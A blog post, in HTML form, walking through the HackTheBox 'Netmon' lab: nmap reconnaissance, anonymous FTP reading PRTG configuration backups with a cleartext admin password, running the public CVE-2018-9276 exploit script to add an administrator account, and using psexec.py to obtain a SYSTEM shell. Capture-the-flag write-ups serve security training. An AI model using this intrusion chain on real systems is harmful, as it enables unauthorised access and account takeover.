@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || HackTheBox - Netmon [no metasploit]</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">HackTheBox - Netmon [no metasploit]</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="November 11, 2020">
+      Nov 11
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/hackthebox">hackthebox</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/windows">windows</a>
+    <a href="https://shiny-labs.re/tags/ftp">ftp</a>
+    <a href="https://shiny-labs.re/tags/cve">cve</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <p><img src="img/image-20201111091732591.png" alt="image-20201111091732591"></p>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">export ip=10.10.10.152
+</code></pre></div><h2 id="nmap">Nmap</h2>
+<p>Starting with a Nmap TCP scan to discover used ports and services behind, with our usual options:</p>
+<ul>
+<li><code>-sC</code> runs defaults Nmap scripts</li>
+<li><code>-sV</code> tries to identify the software versions</li>
+<li><code>-oA</code> will output the results in files prefixed by nmap_tcp and using the formats xml, nmap and gnmap</li>
+<li><code>-p-</code> will scan all ports and not the 1000 usual ones</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">sudo nmap -O -sV -sC -oA nmap_tcp -p- $ip
+Nmap scan report for 10.10.10.152
+Host is up (0.043s latency).
+Not shown: 65522 closed ports
+PORT      STATE SERVICE      VERSION
+21/tcp    open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-02-19  11:18PM                 1024 .rnd
+| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub
+| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
+| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files
+| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)
+| 02-03-19  07:08AM       &lt;DIR&gt;          Users
+|_02-25-19  10:49PM       &lt;DIR&gt;          Windows
+| ftp-syst:
+|_  SYST: Windows_NT
+80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-server-header: PRTG/18.1.37.13946
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+|_http-trane-info: Problem with XML parsing of /evox/about
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/8%OT=21%CT=1%CU=41247%PV=Y%DS=2%DC=I%G=Y%TM=5FA85EA
+OS:0%P=x86_64-unknown-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=
+OS:S%TS=A)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%
+OS:O5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W
+OS:6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=
+OS:O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%
+OS:DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O
+OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80
+OS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
+OS:=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y
+OS:%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 4m54s, deviation: 0s, median: 4m53s
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-11-08T21:14:41
+|_  start_date: 2020-11-08T21:01:14
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 333.90 seconds
+</code></pre></div><p>UDP scans (with the <code>-sU</code> flag) in the background:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">sudo nmap -sU -oA nmap_udp_light $ip
+Nmap scan report for 10.10.10.152
+Host is up (0.045s latency).
+Not shown: 993 closed ports
+PORT     STATE         SERVICE
+123/udp  open|filtered ntp
+137/udp  open|filtered netbios-ns
+138/udp  open|filtered netbios-dgm
+500/udp  open|filtered isakmp
+4500/udp open|filtered nat-t-ike
+5353/udp open|filtered zeroconf
+5355/udp open|filtered llmnr
+
+Nmap done: 1 IP address (1 host up) scanned in 1087.66 seconds
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">sudo nmap -sU -oA nmap_udp -p- $ip
+</code></pre></div><h2 id="strategy">Strategy</h2>
+<ul>
+<li>Start with the FTP anonymous access because we seem to have read access and we could get user.txt from there</li>
+<li>The website is running a software named PRTG Network Monitor: try default credentials and look for vulnerabilities.</li>
+</ul>
+<h1 id="ftp---port-21">FTP - port 21</h1>
+<h2 id="anonymous-access">Anonymous Access</h2>
+<p>The anonymous access allows us to browse the whole file system (<code>C:\</code>) as an unprivileged user (we don&rsquo;t have access to the Administrator directory). We also get some free information about the OS: <code>Windows_NT</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[ bamboozled-goose /mnt/hgfs/netmon ]# ftp $ip
+Connected to 10.10.10.152.
+220 Microsoft FTP Service
+Name (10.10.10.152:moo): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-02-19  11:18PM                 1024 .rnd
+02-25-19  09:15PM       &lt;DIR&gt;          inetpub
+07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
+02-25-19  09:56PM       &lt;DIR&gt;          Program Files
+02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)
+02-03-19  07:08AM       &lt;DIR&gt;          Users
+02-25-19  10:49PM       &lt;DIR&gt;          Windows
+226 Transfer complete.
+ftp&gt; ls Users
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-25-19  10:44PM       &lt;DIR&gt;          Administrator
+02-02-19  11:35PM       &lt;DIR&gt;          Public
+226 Transfer complete.
+ftp&gt; cd Administrator
+550 Access is denied.
+</code></pre></div><p>Note that we can&rsquo;t upload files:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; put test.txt
+200 PORT command successful.
+550 Access is denied.
+</code></pre></div><h2 id="usertxt">user.txt</h2>
+<p>That shell happens to allow access to <code>C:/Users/Public</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; cd Users/Public
+250 CWD command successful.
+ftp&gt; ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-03-19  07:05AM       &lt;DIR&gt;          Documents
+07-16-16  08:18AM       &lt;DIR&gt;          Downloads
+07-16-16  08:18AM       &lt;DIR&gt;          Music
+07-16-16  08:18AM       &lt;DIR&gt;          Pictures
+02-02-19  11:35PM                   33 user.txt
+07-16-16  08:18AM       &lt;DIR&gt;          Videos
+226 Transfer complete.
+ftp&gt; get user.txt
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+WARNING! 1 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Transfer complete.
+33 bytes received in 0.0399 seconds (826 bytes/s)
+</code></pre></div><p>That was a low-effort <code>user.txt</code>! What&rsquo;s next?</p>
+<h1 id="website---port-80">Website - port 80</h1>
+<h2 id="website">Website</h2>
+<p><img src="img/image-20201108221725075.png" alt="image-20201108221725075"></p>
+<h2 id="default-credentials">Default Credentials</h2>
+<p>Looking for <code>PRTG default credentials</code> gives us a <a href="https://www.paessler.com/manuals/prtg/login">link to PRTG&rsquo;s website</a>:</p>
+<p><img src="img/image-20201108224655698.png" alt="image-20201108224655698"></p>
+<p>Alright, let&rsquo;s try<code>prtgadmin</code>:<code>prtgadmin</code>  then:</p>
+<p><img src="img/image-20201108224104391.png" alt="image-20201108224104391"></p>
+<p>Default credentials didn&rsquo;t work, let&rsquo;s move on and check the vulnerabilities.</p>
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+<p>The Nmap scan gives us the version and the software used by the website:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+</code></pre></div><p>Looking for vulnerability affecting PRTG network monitor gives us:</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/44500">PRTG Network Monitor &lt; 18.1.39.1648 - Stack Overflow (Denial of Service)</a></li>
+<li><a href="https://www.exploit-db.com/exploits/46527">PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</a></li>
+</ul>
+<p>The first exploit is a DoS is not interesting, the second one on the other hand&hellip; Remote Code Execution, this is more my jam.</p>
+<p>Let&rsquo;s get a copy of that exploit and see what it needs:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[ bamboozled-goose /mnt/hgfs/netmon ]# searchsploit -m 46527
+  Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/46527
+     Path: /usr/share/exploits/exploit-db/exploitdb/exploits/windows/webapps/46527.sh
+File Type: Bourne-Again shell script, ASCII text executable, with very long lines, with CRLF line terminators
+
+Copied to: /mnt/hgfs/netmon/46527.sh
+</code></pre></div><p>Alright, let&rsquo;s run it:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[ bamboozled-goose /mnt/hgfs/netmon ]# ./46527.sh
+bash: ./46527.sh: /bin/bash^M: bad interpreter: No such file or directory
+</code></pre></div><p>Buh. That file uses DOS style carriage return <code>^M</code>, which Linux doesn&rsquo;t understand. Windows newlines are <code>\r\n</code> while Linux uses <code>\n</code>. You can use <code>cat -v</code> to print the file with those pesky <code>^M</code> visible:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ cat -v 46527.sh
+<span class="c1">#!/bin/bash^M</span>
+<span class="nb">echo</span> -e <span class="s2">&#34;\n\e[00;33m[+]#########################################################################[+] \e[00m&#34;</span>^M
+<span class="nb">echo</span> -e <span class="s2">&#34;\e[00;32m[*] Authenticated PRTG network Monitor remote code execution                [*] \e[00m&#34;</span>^M
+<span class="nb">echo</span> -e <span class="s2">&#34;\e[00;33m[+]#########################################################################[+] \e[00m&#34;</span>^M
+<span class="o">[</span>...<span class="o">]</span>
+</code></pre></div><p>To get rid of DOS return carriage and replace them with Linux return carriage, you can use this sed command:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">sed -e &#34;s/\r//g&#34; 46527.sh &gt; 46527_fixed.sh
+</code></pre></div><p>Enable script execution and we can now run the fixed script:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ chmod +x 46527_fixed.sh
+</code></pre></div><p><img src="img/image-20201110214926129.png" alt="image-20201110214926129"></p>
+<p>Okay, so now we have the usage. But that exploits needs the cookie of an existing account to work, and we already tried <code>prtgadmin:prtgadmin</code> without success. How are we going to find another account&hellip;</p>
+<h2 id="hunting-for-credentials">Hunting for credentials</h2>
+<p>Well. Remember how we could any file with the anonymous FTP? Where does PRTG stores his user accounts? Can we access them?</p>
+<p>The knowledge base of PRTG has all kind of answers for us! Like an article on <a href="https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data#reply-1053">How and where PRTG stores his data</a>. This tells us that users are stored in PRTG Configuration.dat.</p>
+<p><img src="img/image-20201110215735980.png" alt="image-20201110215735980"></p>
+<p>And the Data Directory is one of those four paths:</p>
+<p><img src="img/image-20201110215920746.png" alt="image-20201110215920746"></p>
+<p>Let&rsquo;s check if we have access from the FTP, this time with the <code>-i</code> option to not have to answer <code>y</code> to each file we download:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ftp -i $ip
+Connected to 10.10.10.152.
+220 Microsoft FTP Service
+Name (10.10.10.152:moo): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; cd &#34;programdata\Paessler\PRTG Network Monitor&#34;
+250 CWD command successful.
+ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+11-10-20  04:10PM       &lt;DIR&gt;          Configuration Auto-Backups
+11-10-20  03:28PM       &lt;DIR&gt;          Log Database
+02-02-19  11:18PM       &lt;DIR&gt;          Logs (Debug)
+02-02-19  11:18PM       &lt;DIR&gt;          Logs (Sensors)
+02-02-19  11:18PM       &lt;DIR&gt;          Logs (System)
+11-10-20  03:28PM       &lt;DIR&gt;          Logs (Web Server)
+11-10-20  03:34PM       &lt;DIR&gt;          Monitoring Database
+02-25-19  09:54PM              1189697 PRTG Configuration.dat
+02-25-19  09:54PM              1189697 PRTG Configuration.old
+07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
+11-10-20  04:10PM              1671119 PRTG Graph Data Cache.dat
+02-25-19  10:00PM       &lt;DIR&gt;          Report PDFs
+02-02-19  11:18PM       &lt;DIR&gt;          System Information Database
+02-02-19  11:40PM       &lt;DIR&gt;          Ticket Database
+02-02-19  11:18PM       &lt;DIR&gt;          ToDo Database
+226 Transfer complete.
+
+</code></pre></div><p>Let&rsquo;s download all we can with <code>mget *</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; mget *
+local: PRTG Configuration.dat remote: PRTG Configuration.dat
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+1189697 bytes received in 0.58 seconds (1.96 Mbytes/s)
+local: PRTG Configuration.old remote: PRTG Configuration.old
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+1189697 bytes received in 0.645 seconds (1.76 Mbytes/s)
+local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+1153755 bytes received in 0.603 seconds (1.83 Mbytes/s)
+local: PRTG Graph Data Cache.dat remote: PRTG Graph Data Cache.dat
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+WARNING! 546 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Transfer complete.
+1671119 bytes received in 0.814 seconds (1.96 Mbytes/s)
+</code></pre></div><p>Can we find the password for <code>prtgadmin</code> in those files we just looted?</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[ bamboozled-goose /mnt/hgfs/netmon/PRTG ]# rg prtgadmin
+PRTG Configuration.old.bak
+141:	      &lt;!-- User: prtgadmin --&gt;
+29166:                  prtgadmin
+
+PRTG Configuration.dat
+29942:                  prtgadmin
+
+PRTG Configuration.old
+29942:                  prtgadmin
+</code></pre></div><p>And look, in that <code>PRTG Configuration.old.bak</code> file:</p>
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml">             <span class="nt">&lt;dbpassword&gt;</span>
+              <span class="c">&lt;!-- User: prtgadmin --&gt;</span>
+              PrTg@dmin2018
+            <span class="nt">&lt;/dbpassword&gt;</span>
+</code></pre></div><p>Hey look, a password that doesn&rsquo;t look like it&rsquo;s encrypted!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">login:    prtgadmin
+password: PrTg@dmin2018
+</code></pre></div><p>Annnnnnnnnd:</p>
+<p><img src="img/image-20201110224047130.png" alt="image-20201110224047130"></p>
+<p>It&rsquo;s that familiar &ldquo;failed login&rdquo; page again!</p>
+<p>Here, I went lost on several other stuff, thinking this was the wrong path. After a while, I checked writeups to see where I went wrong&hellip; And&hellip; I didn&rsquo;t. It&rsquo;s just you need to &ldquo;update&rdquo; the leaked password&hellip; Sheesh.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">login:    prtgadmin
+password: PrTg@dmin2019
+</code></pre></div><p>And this lets us in:</p>
+<p><img src="img/image-20201110224509410.png" alt="image-20201110224509410"></p>
+<h2 id="back-to-our-exploit">Back to our exploit</h2>
+<p>We can now grab the cookie we needed to run the exploit!</p>
+<p>I used the Firefox Web developer tools to copy the cookie. Open the storage tab, clicking on the cookie should open the data panel on the right and from there you can just right click on the cookie content and select copy.</p>
+<p><img src="img/image-20201110225238795.png" alt="image-20201110225238795"></p>
+<p>Content of the cookie:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">OCTOPUS1813713946:&#34;ezc0MzQ4NTRBLTUyMUQtNDc3My1CRTJDLTBGRDBCQUM2OUMyRX0%3D&#34;
+</code></pre></div><p>Now, let&rsquo;s we can finally run the exploit from earlier:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[ bamboozled-goose /mnt/hgfs/netmon/PRTG ]# ./46527_fixed.sh -u http://10.10.10.152 -c &#34;OCTOPUS1813713946=ezc0MzQ4NTRBLTUyMUQtNDc3My1CRTJDLTBGRDBCQUM2OUMyRX0%3D&#34;
+
+[+]#########################################################################[+]
+[*] Authenticated PRTG network Monitor remote code execution                [*]
+[+]#########################################################################[+]
+[*] Date: 11/03/2019                                                        [*]
+[+]#########################################################################[+]
+[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*]
+[+]#########################################################################[+]
+[*] Vendor Homepage: https://www.paessler.com/prtg                          [*]
+[*] Version: 18.2.38                                                        [*]
+[*] CVE: CVE-2018-9276                                                      [*]
+[*] Reference: https://www.codewatch.org/blog/?p=453                        [*]
+[+]#########################################################################[+]
+
+# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
+# run the script to create a new user &#39;pentest&#39; in the administrators group with password &#39;P3nT3st!&#39;
+
+[+]#########################################################################[+]
+
+ [*] file created
+ [*] sending notification wait....
+
+ [*] adding a new user &#39;pentest&#39; with password &#39;P3nT3st&#39;
+ [*] sending notification wait....
+
+ [*] adding a user pentest to the administrators group
+ [*] sending notification wait....
+
+
+ [*] exploit completed new user &#39;pentest&#39; with password &#39;P3nT3st!&#39; created have fun!
+</code></pre></div><p>It works and should have created a user <code>pentest</code> with the password <code>P3nT3st!</code>.</p>
+<h1 id="shell-as-system">Shell as system</h1>
+<p>To get a shell, we can use <code>psexec.py</code> which is bundled with impacket.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[ bamboozled-goose /mnt/hgfs/netmon ]# psexec.py pentest:&#39;P3nT3st!&#39;@10.10.10.152
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+</code></pre></div><p>Buh. Reset the machine and try the exploit again&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[ bamboozled-goose /mnt/hgfs/netmon ]# psexec.py pentest:&#39;P3nT3st!&#39;@10.10.10.152
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.152.....
+[*] Found writable share ADMIN$
+[*] Uploading file RydLqDhH.exe
+[*] Opening SVCManager on 10.10.10.152.....
+[*] Creating service rIla on 10.10.10.152.....
+[*] Starting service rIla.....
+[!] Press help for extra shell commands                             Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre></div><p>That&rsquo;s better! Now, grab the flag:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\Users\Administrator\Desktop&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 684B-9CE8
+
+ Directory of C:\Users\Administrator\Desktop
+
+02/02/2019  11:35 PM    &lt;DIR&gt;          .
+02/02/2019  11:35 PM    &lt;DIR&gt;          ..
+02/02/2019  11:35 PM                33 root.txt
+               1 File(s)             33 bytes
+               2 Dir(s)  12,049,416,192 bytes free
+</code></pre></div><p>I was curious about the OS, so I also ran <code>systeminfo</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\Users\Administrator\Desktop&gt;systeminfo
+Host Name:                 NETMON
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00376-30821-30176-AA362
+Original Install Date:     2/3/2019, 7:05:45 AM
+System Boot Time:          11/11/2020, 3:05:20 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-05:00) Eastern Time (US &amp; Canada)
+Total Physical Memory:     4,095 MB
+Available Physical Memory: 3,301 MB
+Virtual Memory: Max Size:  4,799 MB
+Virtual Memory: Available: 4,051 MB
+Virtual Memory: In Use:    748 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 2 Hotfix(s) Installed.
+                           [01]: KB3199986
+                           [02]: KB3200970
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.152
+                                 [02]: fe80::b978:7945:582d:5ff9
+                                 [03]: dead:beef::b978:7945:582d:5ff9
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+</code></pre></div><h1 id="takeaways">Takeaways</h1>
+<ul>
+<li>If you find a password in an old backup: try updating the year (If you find P@ssw0rd2017, try P@ssw0rd2018, P@ssw0rd2019, &hellip;)</li>
+<li>Leaving backup of configurations with passwords in clear is a bad thing, just remove them</li>
+<li>While you&rsquo;re there, no one needs a free access to your FTP to read the whole filesystem.</li>
+</ul>
+<p><img src="img/cat_baguette.gif" alt="cat baguette"></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#strategy">Strategy</a></li>
+      </ul>
+    </li>
+    <li><a href="#ftp---port-21">FTP - port 21</a>
+      <ul>
+        <li><a href="#anonymous-access">Anonymous Access</a></li>
+        <li><a href="#usertxt">user.txt</a></li>
+      </ul>
+    </li>
+    <li><a href="#website---port-80">Website - port 80</a>
+      <ul>
+        <li><a href="#website">Website</a></li>
+        <li><a href="#default-credentials">Default Credentials</a></li>
+        <li><a href="#vulnerabilities">Vulnerabilities</a></li>
+        <li><a href="#hunting-for-credentials">Hunting for credentials</a></li>
+        <li><a href="#back-to-our-exploit">Back to our exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-system">Shell as system</a></li>
+    <li><a href="#takeaways">Takeaways</a></li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
